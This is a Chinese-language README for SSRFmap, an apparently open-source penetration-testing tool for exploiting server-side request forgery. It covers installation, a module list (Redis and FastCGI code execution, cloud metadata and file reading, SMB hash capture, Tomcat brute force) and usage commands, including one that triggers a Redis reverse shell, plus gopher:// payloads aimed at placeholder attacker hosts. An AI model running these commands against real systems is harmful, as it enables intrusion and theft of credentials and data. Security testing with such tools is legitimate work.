# SSRFmap [![CI](https://github.com/swisskyrepo/SSRFmap/actions/workflows/ci.yml/badge.svg)](https://github.com/swisskyrepo/SSRFmap/actions/workflows/ci.yml) [![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/) [![Rawsec's CyberSecurity Inventory](https://inventory.raw.pm/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.raw.pm/)


SSRF 漏洞常被用来对其他服务实施进一步攻击，本框架旨在轻松发现并利用这些服务。SSRFmap 以 Burp 请求文件作为输入，并指定一个待模糊测试的参数。

> 服务端请求伪造（Server Side Request Forgery，SSRF）是一种漏洞，攻击者可以利用它诱使服务器代替自己发起请求。

## 目录

* [安装与使用](#安装与使用)
* [模块](#模块)
* [示例](#示例)
* [SSRFmap 测试](#ssrfmap-测试)
* [参与贡献](#参与贡献)
  * [路线图](#路线图)
  * [感谢贡献者](#感谢贡献者)


## 安装与使用

### Github 安装

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
uv sync --frozen
uv run python ssrfmap.py --help

  usage: ssrfmap.py [-h] -r REQFILE -p PARAM [-m MODULES] [-l [HANDLER]] [-v]
                    [--lhost LHOST] [--lport LPORT] [--ldomain LDOMAIN]
                    [--rfiles [TARGETFILES]] [--uagent USERAGENT] [--ssl [SSL]]
                    [--proxy PROXY] [--level [LEVEL]] [--logfile LOGFILE]

  options:
    -h, --help          show this help message and exit
    -r REQFILE          SSRF 请求文件
    -p PARAM            要攻击的 SSRF 参数
    -m MODULES          要启用的 SSRF 模块
    -l [HANDLER]        启动一个反弹 Shell 处理器
    -v                  启用详细输出
    --lhost LHOST       反弹 Shell 的 LHOST 或网络内目标 IP
    --lport LPORT       反弹 Shell 的 LPORT 或网络内目标端口
    --ldomain LDOMAIN   AXFR 查询或域名相关模块的目标域名
    --rfiles [TARGETFILES]
                        readfiles 模块要读取的文件
    --uagent USERAGENT  要使用的 User Agent
    --ssl [SSL]         使用 HTTPS 且不校验证书
    --proxy PROXY       使用 HTTP(s) 代理（例：http://localhost:8080）
    --level [LEVEL]     测试级别（1-5，默认：1）
    --logfile LOGFILE   SSRFmap 日志文件
```

### Docker 使用

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
docker build -t ssrfmap .
docker run --rm ssrfmap ssrfmap.py --help

# 仅在运行时挂载所需的请求文件。
docker run --rm -it \
  -v "$(pwd)/examples:/requests:ro" \
  ssrfmap ssrfmap.py -r /requests/request.txt -p url -m readfiles
```

## 模块

以下模块均已实现，可通过 `-m` 参数使用。

| 名称           | 说明                                                     |
| :------------- | :------------------------------------------------------- |
| `axfr`         | DNS 区域传送（AXFR）                                     |
| `fastcgi`      | FastCGI RCE                                              |
| `redis`        | Redis RCE                                                |
| `github`       | Github Enterprise RCE < 2.8.7                            |
| `zabbix`       | Zabbix RCE                                               |
| `mysql`        | MySQL 命令执行                                           |
| `postgres`     | Postgres 命令执行                                        |
| `docker`       | 通过 API 泄露 Docker 信息                                |
| `smtp`         | SMTP 发送邮件                                            |
| `portscan`     | 扫描主机的 Top 8000 端口                                 |
| `networkscan`  | 通过 HTTP Ping 扫描内网存活主机                          |
| `readfiles`    | 读取文件，例如 `/etc/passwd`                             |
| `alibaba`      | 读取云厂商的文件（如 meta-data、user-data）              |
| `aws`          | 读取云厂商的文件（如 meta-data、user-data）              |
| `gce`          | 读取云厂商的文件（如 meta-data、user-data）              |
| `digitalocean` | 读取云厂商的文件（如 meta-data、user-data）              |
| `socksproxy`   | SOCKS4 代理                                              |
| `smbhash`      | 通过 UNC 路径强制触发 SMB 认证                           |
| `tomcat`       | 针对 Tomcat Manager 的暴力破解攻击                       |
| `custom`       | 向监听服务发送自定义数据，例如 netcat                    |
| `memcache`     | 将数据存入 memcache 实例                                 |


## 示例

首先你需要一个带有待模糊测试参数的请求，Burp 请求与 SSRFmap 配合良好。
请求应类似下面这样。更多示例见 **./examples** 目录。

```powershell
POST /ssrf HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mysimple.ssrf/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close
Upgrade-Insecure-Requests: 1

url=https%3A%2F%2Fwww.google.fr
```

使用 `-m` 加模块名（如需同时运行多个模块，用 `,` 分隔）。

```bash
# 对 localhost 发起端口扫描并读取默认文件
uv run python ssrfmap.py -r examples/request.txt -p url -m readfiles,portscan
```

如果你想注入到 Header、GET、POST 或 PUT 参数中，指定其名称即可：

```bash
uv run python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /tmp/test
```

默认情况下，SSRFmap 会替换所选参数的完整值。若要保留原有的部分内容，
请将 `*FUZZ*` 放在 payload 应当插入的确切位置：

```text
url=test;*FUZZ*;end
```

使用 `-p url` 时会保留 `test;` 和 `;end`，仅用各个 payload 替换 `*FUZZ*`。
该标记适用于 GET 参数、Header、POST/PUT 请求体、JSON、XML 以及 multipart 表单字段。

如需自定义 User-Agent，使用 `--uagent`。某些目标使用 HTTPS，可通过 `--ssl` 启用。

```bash
# 使用自定义 User-Agent 对 HTTPS 端点发起端口扫描
uv run python ssrfmap.py -r examples/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
```

部分模块支持建立反向连接，此时需要指定 `LHOST` 和 `LPORT`。SSRFmap 还可以监听传入的反弹 Shell。

```bash
# 在 Redis 上触发一个反弹 Shell
uv run python ssrfmap.py -r examples/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242

# -l 在指定端口创建反弹 Shell 监听器
# --lhost 和 --lport 的用法与 Metasploit 类似，这些值用于生成反弹 Shell 的 payload
```

当目标受 WAF 或某些过滤机制保护时，可以通过 `--level` 参数尝试更广泛的 payload 与编码变体。

```text
--level : 调整 payload 以绕过某些 IDS/WAF 的能力。例如：127.0.0.1 -> [::] -> 0000: -> ...
```

## SSRFmap 测试

运行自动化单元测试和 lint 检查：

```bash
uv run pytest
uv run ruff check .
uv run ruff format --check .
```

一种快速测试本框架的方式是使用 `data/example.py` 提供的 SSRF 服务。

### 本地测试

```bash
# 运行示例 SSRF HTTP 服务
uv run flask --app examples/example.py run &

# 运行 ssrfmap 工具
uv run python ssrfmap.py -r examples/request.txt -p url -m readfiles

# 复现 URL 位于 multipart/form-data 请求体中的 SSRF
uv run python ssrfmap.py -r examples/request7.txt -p url -m readfiles --rfiles /etc/issue

# 复现 PUT 类型的 SSRF，同时保留 *FUZZ* 之前的值前缀
uv run python ssrfmap.py -r examples/request8.txt -p url -m readfiles --rfiles /etc/issue

# 复现通过 PUT 发送 JSON 请求体的 SSRF；注入参数为 url
uv run python ssrfmap.py -r examples/request9.txt -p url -m readfiles --rfiles /etc/issue

# 保留原值，仅替换 POST 值中的 *FUZZ*
uv run python ssrfmap.py -r examples/request10.txt -p url -m readfiles --rfiles /etc/issue
```

读取到的文件和云元数据会保存在 `loot/<target>/` 目录下。`loot/` 目录已被
Git 忽略，不得提交到仓库。

### Docker 测试

```bash
docker build -t ssrfmap .
mkdir -p loot

# 在命名的后台容器中运行示例 SSRF HTTP 服务。
docker run --name example --rm -d -p 5000:5000 \
  -v "$(pwd)/loot:/usr/src/app/loot" \
  ssrfmap examples/example.py

# 在同一容器和 uv 环境中运行 SSRFmap 的测试。
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request.txt -p url -m readfiles
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request2.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request3.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request4.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request5.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request7.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request8.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request9.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request10.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request.txt -p url -m axfr
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request3.txt -p url -m axfr --lhost 127.0.0.1 --lport 53 --ldomain example.lab

# 测试结束后停止并删除示例容器。
docker stop example
```


## 参与贡献

我 :heart: Pull Request :)

### 路线图

欢迎实现下列任意功能或新增一种服务：

- Redis PHP 利用
- HTTP 模块（Jenkins ？）

  ```text
  gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
  gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
  ```

你也可以在现实中请作者喝杯啤酒，或通过 Github Sponsor 按钮支持本项目。

### 感谢贡献者

<p align="center">
<a href="https://github.com/swisskyrepo/SSRFmap/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=swisskyrepo/SSRFmap&max=36">
</a>
</p>


## 灵感来源

- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)
- [Gopherus - Github](https://github.com/tarunkant/Gopherus)
- [SSRF testing - cujanovic](https://github.com/cujanovic/SSRF-Testing)
